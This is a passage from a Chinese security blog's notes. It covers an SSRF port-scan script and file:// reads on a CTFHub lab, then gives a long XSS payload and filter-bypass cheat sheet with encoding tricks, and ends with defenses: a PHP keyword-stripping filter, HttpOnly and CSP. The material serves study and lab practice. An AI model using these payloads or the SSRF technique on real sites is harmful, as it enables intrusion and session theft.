src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240813144044100.png" alt="image-20240813144044100"></p><p>首先我们的题目告诉我们端口范围，所以我们直接进行脚本爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8000</span>,<span class="number">9001</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://challenge-951d929ab79bf81a.sandbox.ctfhub.com:10800/?url=127.0.0.1:<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(i,res.text)</span><br></pre></td></tr></table></figure><p>保存后直接运行，最后我们可以得到相关的结果，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240813145059547.png" alt="image-20240813145059547"></p><p>成功获取</p><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>我们可以利用伪协议对服务器上的文件进行读取，例如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file:///D:/www.txt</span><br><span class="line"><span class="built_in">dict</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3306</span>/info</span><br><span class="line">ftp://<span class="number">192.168</span><span class="number">.46</span><span class="number">.148</span>:<span class="number">21</span></span><br></pre></td></tr></table></figure><p>我们也以CTFHUB上的例题来进行演示，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240813145208833.png" alt="image-20240813145208833"></p><p>题目告诉我们要通过伪协议进行读取web目录下的flag.php，我们知道，web目录一般为<code>var/www/html/flag.php</code>，所以我们直接读取<code>file:///var/www/html/flag.php</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240813145536404.png" alt="image-20240813145536404"></p><p>同样，我们可以让服务器自己下载我们准备好的木马，然后进攻内网，这里也不再赘述</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> CSRF&amp;SSRF </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-XSS绕过与修复</title>
      <link href="/post/54325f93.html"/>
      <url>/post/54325f93.html</url>
      
        <content type="html"><![CDATA[<h1 id="无过滤情况下"><a href="#无过滤情况下" class="headerlink" title="无过滤情况下"></a>无过滤情况下</h1><h2 id="常见标签"><a href="#常见标签" class="headerlink" title="常见标签"></a>常见标签</h2><h3 id="lt-script-gt"><a href="#lt-script-gt" class="headerlink" title="&lt;script&gt;"></a><code>&lt;script&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="lt-img-gt"><a href="#lt-img-gt" class="headerlink" title="&lt;img&gt;"></a><code>&lt;img&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure><h3 id="lt-input-gt"><a href="#lt-input-gt" class="headerlink" title="&lt;input&gt;"></a><code>&lt;input&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>通过<code>autofocus</code>属性执行本身的<code>focus</code>事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span> autofocus&gt;</span><br></pre></td></tr></table></figure><h3 id="lt-details-gt"><a href="#lt-details-gt" class="headerlink" title="&lt;details&gt;"></a><code>&lt;details&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;details ontoggle=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span><br><span class="line">使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line">&lt;details open ontoggle=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="lt-svg-gt"><a href="#lt-svg-gt" class="headerlink" title="&lt;svg&gt;"></a><code>&lt;svg&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure><h3 id="lt-select-gt"><a href="#lt-select-gt" class="headerlink" title="&lt;select&gt;"></a><code>&lt;select&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;select onfocus=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;&lt;/select&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="lt-iframe-gt"><a href="#lt-iframe-gt" class="headerlink" title="&lt;iframe&gt;"></a><code>&lt;iframe&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h3 id="lt-video-gt"><a href="#lt-video-gt" class="headerlink" title="&lt;video&gt;"></a><code>&lt;video&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;video&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="lt-audio-gt"><a href="#lt-audio-gt" class="headerlink" title="&lt;audio&gt;"></a><code>&lt;audio&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;audio src=x  onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure><h3 id="lt-body-gt"><a href="#lt-body-gt" class="headerlink" title="&lt;body&gt;"></a><code>&lt;body&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;body/onload=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure><p>利用换行符以及autofocus，自动触发onscroll事件，无需用户去触发</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;body</span><br><span class="line">onscroll=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="lt-textarea-gt"><a href="#lt-textarea-gt" class="headerlink" title="&lt;textarea&gt;"></a><code>&lt;textarea&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;textarea onfocus=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>); autofocus&gt;</span><br></pre></td></tr></table></figure><h3 id="lt-keygen-gt"><a href="#lt-keygen-gt" class="headerlink" title="&lt;keygen&gt;"></a><code>&lt;keygen&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=<span class="title function_">alert</span>(<span class="number">1</span>)&gt; <span class="comment">//仅限火狐</span></span><br></pre></td></tr></table></figure><h3 id="lt-marquee-gt"><a href="#lt-marquee-gt" class="headerlink" title="&lt;marquee&gt;"></a><code>&lt;marquee&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;marquee onstart=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&gt;&lt;<span class="regexp">/marquee&gt; /</span>/<span class="title class_">Chrome</span>不行，火狐和<span class="variable constant_">IE</span>都可以</span><br></pre></td></tr></table></figure><h3 id="lt-isindex-gt"><a href="#lt-isindex-gt" class="headerlink" title="&lt;isindex&gt;"></a><code>&lt;isindex&gt;</code></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;isindex type=image src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&gt;<span class="comment">//仅限于IE</span></span><br></pre></td></tr></table></figure><h2 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h2><p><code>&lt;a&gt;</code>标签</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(`xss`);&quot;</span>&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;iframe&gt;</code>标签</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code>标签</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;<span class="comment">//IE7以下</span></span><br></pre></td></tr></table></figure><p><code>&lt;form&gt;</code>标签</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;Javascript:alert(1)&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h1 id="有过滤的情况下"><a href="#有过滤的情况下" class="headerlink" title="有过滤的情况下"></a>有过滤的情况下</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>用<code>/</code>代替空格</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>/onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure><h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">ImG</span> sRc=x onerRor=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>有的时候waf只会替换一次且是替换为空，这个时候我们就可以采用双向关键字绕过</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;imimgg srsrcc=x onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure><h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><p>利用eval</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>利用top</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>Unicode编码绕过</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>url编码绕过</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>Ascii码绕过</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>hex绕过</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="built_in">eval</span>(<span class="string">&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><p>八进制</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="string">&#x27;\170\163\163&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><p>base64绕过</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="过滤双引号、单引号"><a href="#过滤双引号、单引号" class="headerlink" title="过滤双引号、单引号"></a>过滤双引号、单引号</h2><p>1.如果是html标签中，我们可以不用引号，如果是在js中，我们可以用反引号代替单双引号</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="title function_">alert</span>(<span class="string">`xss`</span>);&gt;</span><br></pre></td></tr></table></figure><p>2.使用编码绕过</p><h2 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h2><p>当括号被过滤的时候我们可以使用throw来绕过</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h2><p>我们可以使用IP地址进行绕过，我们可以使用十进制IP地址，也可以使用八进制IP地址，例如</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">`http://2130706433/`</span>&gt; <span class="comment">//十进制IP</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span> //八进制IP</span></span><br></pre></td></tr></table></figure><h1 id="XSS防护"><a href="#XSS防护" class="headerlink" title="XSS防护"></a>XSS防护</h1><h2 id="过滤特殊符号"><a href="#过滤特殊符号" class="headerlink" title="过滤特殊符号"></a>过滤特殊符号</h2><p>过滤一些危险字符，以及转义字符<code>&amp;、&lt;、&gt;、&quot;、&#39;</code>，通过相关的函数进行过滤XSS标签，如下所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自定义过滤函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove_xss</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed</span></span><br><span class="line">  <span class="comment">// this prevents some character re-spacing such as &lt;java\0script&gt;</span></span><br><span class="line">  <span class="comment">// note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs</span></span><br><span class="line">  <span class="variable">$val</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">  <span class="comment">// straight replacements, the user should never need these since they&#x27;re normal characters</span></span><br><span class="line">  <span class="comment">// this prevents like &lt;IMG SRC=@avascript:alert(&#x27;XSS&#x27;)&gt;</span></span><br><span class="line">  <span class="variable">$search</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">  <span class="variable">$search</span> .= <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">  <span class="variable">$search</span> .= <span class="string">&#x27;1234567890!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">  <span class="variable">$search</span> .= <span class="string">&#x27;~`&quot;;:?+/=&#123;&#125;[]-_|\&#x27;\\&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$search</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">   <span class="comment">// ;? matches the ;, which is optional</span></span><br><span class="line">   <span class="comment">// 0&#123;0,7&#125; matches any padded zeros, which are optional and go up to 8 chars</span></span><br><span class="line">   <span class="comment">// @ @ search for the hex values</span></span><br><span class="line">   <span class="variable">$val</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&amp;#[xX]0&#123;0,8&#125;&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$search</span>[<span class="variable">$i</span>])).<span class="string">&#x27;;?)/i&#x27;</span>, <span class="variable">$search</span>[<span class="variable">$i</span>], <span class="variable">$val</span>); <span class="comment">// with a ;</span></span><br><span class="line">   <span class="comment">// @ @ 0&#123;0,7&#125; matches &#x27;0&#x27; zero to seven times</span></span><br><span class="line">   <span class="variable">$val</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/( &#123;0,8&#125;&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$search</span>[<span class="variable">$i</span>]).<span class="string">&#x27;;?)/&#x27;</span>, <span class="variable">$search</span>[<span class="variable">$i</span>], <span class="variable">$val</span>); <span class="comment">// with a ;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// now the only remaining whitespace attacks are \t, \n, and \r</span></span><br><span class="line">  <span class="variable">$ra1</span> = <span class="keyword">array</span>(<span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;vbscript&#x27;</span>, <span class="string">&#x27;expression&#x27;</span>, <span class="string">&#x27;applet&#x27;</span>, <span class="string">&#x27;meta&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;blink&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;embed&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;iframe&#x27;</span>, <span class="string">&#x27;frame&#x27;</span>, <span class="string">&#x27;frameset&#x27;</span>, <span class="string">&#x27;ilayer&#x27;</span>, <span class="string">&#x27;layer&#x27;</span>, <span class="string">&#x27;bgsound&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;base&#x27;</span>);</span><br><span class="line">  <span class="variable">$ra2</span> = <span class="keyword">array</span>(<span class="string">&#x27;onabort&#x27;</span>, <span class="string">&#x27;onactivate&#x27;</span>, <span class="string">&#x27;onafterprint&#x27;</span>, <span class="string">&#x27;onafterupdate&#x27;</span>, <span class="string">&#x27;onbeforeactivate&#x27;</span>, <span class="string">&#x27;onbeforecopy&#x27;</span>, <span class="string">&#x27;onbeforecut&#x27;</span>, <span class="string">&#x27;onbeforedeactivate&#x27;</span>, <span class="string">&#x27;onbeforeeditfocus&#x27;</span>, <span class="string">&#x27;onbeforepaste&#x27;</span>, <span class="string">&#x27;onbeforeprint&#x27;</span>, <span class="string">&#x27;onbeforeunload&#x27;</span>, <span class="string">&#x27;onbeforeupdate&#x27;</span>, <span class="string">&#x27;onblur&#x27;</span>, <span class="string">&#x27;onbounce&#x27;</span>, <span class="string">&#x27;oncellchange&#x27;</span>, <span class="string">&#x27;onchange&#x27;</span>, <span class="string">&#x27;onclick&#x27;</span>, <span class="string">&#x27;oncontextmenu&#x27;</span>, <span class="string">&#x27;oncontrolselect&#x27;</span>, <span class="string">&#x27;oncopy&#x27;</span>, <span class="string">&#x27;oncut&#x27;</span>, <span class="string">&#x27;ondataavailable&#x27;</span>, <span class="string">&#x27;ondatasetchanged&#x27;</span>, <span class="string">&#x27;ondatasetcomplete&#x27;</span>, <span class="string">&#x27;ondblclick&#x27;</span>, <span class="string">&#x27;ondeactivate&#x27;</span>, <span class="string">&#x27;ondrag&#x27;</span>, <span class="string">&#x27;ondragend&#x27;</span>, <span class="string">&#x27;ondragenter&#x27;</span>, <span class="string">&#x27;ondragleave&#x27;</span>, <span class="string">&#x27;ondragover&#x27;</span>, <span class="string">&#x27;ondragstart&#x27;</span>, <span class="string">&#x27;ondrop&#x27;</span>, <span class="string">&#x27;onerror&#x27;</span>, <span class="string">&#x27;onerrorupdate&#x27;</span>, <span class="string">&#x27;onfilterchange&#x27;</span>, <span class="string">&#x27;onfinish&#x27;</span>, <span class="string">&#x27;onfocus&#x27;</span>, <span class="string">&#x27;onfocusin&#x27;</span>, <span class="string">&#x27;onfocusout&#x27;</span>, <span class="string">&#x27;onhelp&#x27;</span>, <span class="string">&#x27;onkeydown&#x27;</span>, <span class="string">&#x27;onkeypress&#x27;</span>, <span class="string">&#x27;onkeyup&#x27;</span>, <span class="string">&#x27;onlayoutcomplete&#x27;</span>, <span class="string">&#x27;onload&#x27;</span>, <span class="string">&#x27;onlosecapture&#x27;</span>, <span class="string">&#x27;onmousedown&#x27;</span>, <span class="string">&#x27;onmouseenter&#x27;</span>, <span class="string">&#x27;onmouseleave&#x27;</span>, <span class="string">&#x27;onmousemove&#x27;</span>, <span class="string">&#x27;onmouseout&#x27;</span>, <span class="string">&#x27;onmouseover&#x27;</span>, <span class="string">&#x27;onmouseup&#x27;</span>, <span class="string">&#x27;onmousewheel&#x27;</span>, <span class="string">&#x27;onmove&#x27;</span>, <span class="string">&#x27;onmoveend&#x27;</span>, <span class="string">&#x27;onmovestart&#x27;</span>, <span class="string">&#x27;onpaste&#x27;</span>, <span class="string">&#x27;onpropertychange&#x27;</span>, <span class="string">&#x27;onreadystatechange&#x27;</span>, <span class="string">&#x27;onreset&#x27;</span>, <span class="string">&#x27;onresize&#x27;</span>, <span class="string">&#x27;onresizeend&#x27;</span>, <span class="string">&#x27;onresizestart&#x27;</span>, <span class="string">&#x27;onrowenter&#x27;</span>, <span class="string">&#x27;onrowexit&#x27;</span>, <span class="string">&#x27;onrowsdelete&#x27;</span>, <span class="string">&#x27;onrowsinserted&#x27;</span>, <span class="string">&#x27;onscroll&#x27;</span>, <span class="string">&#x27;onselect&#x27;</span>, <span class="string">&#x27;onselectionchange&#x27;</span>, <span class="string">&#x27;onselectstart&#x27;</span>, <span class="string">&#x27;onstart&#x27;</span>, <span class="string">&#x27;onstop&#x27;</span>, <span class="string">&#x27;onsubmit&#x27;</span>, <span class="string">&#x27;onunload&#x27;</span>);</span><br><span class="line">  <span class="variable">$ra</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$ra1</span>, <span class="variable">$ra2</span>);</span><br><span class="line">  <span class="variable">$found</span> = <span class="literal">true</span>; <span class="comment">// keep replacing as long as the previous round replaced something</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="variable">$found</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">   <span class="variable">$val_before</span> = <span class="variable">$val</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$ra</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$pattern</span> = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">     <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ra</span>[<span class="variable">$i</span>]); <span class="variable">$j</span>++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$j</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$pattern</span> .= <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern</span> .= <span class="string">&#x27;(&amp;#[xX]0&#123;0,8&#125;([9ab]);)&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern</span> .= <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern</span> .= <span class="string">&#x27;|( &#123;0,8&#125;([9|10|13]);)&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern</span> .= <span class="string">&#x27;)*&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$pattern</span> .= <span class="variable">$ra</span>[<span class="variable">$i</span>][<span class="variable">$j</span>];</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="variable">$pattern</span> .= <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">     <span class="variable">$replacement</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$ra</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="number">2</span>).<span class="string">&#x27;&lt;x&gt;&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$ra</span>[<span class="variable">$i</span>], <span class="number">2</span>); <span class="comment">// add in &lt;&gt; to nerf the tag</span></span><br><span class="line">     <span class="variable">$val</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$val</span>); <span class="comment">// filter out the hex tags</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$val_before</span> == <span class="variable">$val</span>) &#123;</span><br><span class="line">      <span class="comment">// no replacements were made, so exit the loop</span></span><br><span class="line">      <span class="variable">$found</span> = <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$val</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HTTP-Only-Cookie"><a href="#HTTP-Only-Cookie" class="headerlink" title="HTTP_Only Cookie"></a>HTTP_Only Cookie</h2><p>我们可以在php.ini文件中打开http_only选项，通过设置<code>session.cookie_httponly</code>的值为1或者为true，接着通过<code>setrawcookie</code>的方法开启</p><p>这个方法主要是防止cookie被盗用，当我们登录别的网站的时候，服务器通常会写入一些cookie到我们的浏览器，当下次再访问的时候，由于浏览器自动传递cookie，这样我们就不需要重复进行登录，假如我们的cookie被别人获取，就会暴露我们自己的信息，这个时候，http_only就可以很好的保障我们的cookie安全，其可以限制浏览器里的JavaScript访问cookie，当攻击者通过JavaScript访问了cookie值的时候，对应的cookie值就会立即失效，但是http_only也有一定的缺陷，就是其只防止了js获取cookie，你用beef获取相应的cookie并不会导致失效</p><h2 id="设置CSP-Content-Security-Policy"><a href="#设置CSP-Content-Security-Policy" class="headerlink" title="设置CSP(Content Security 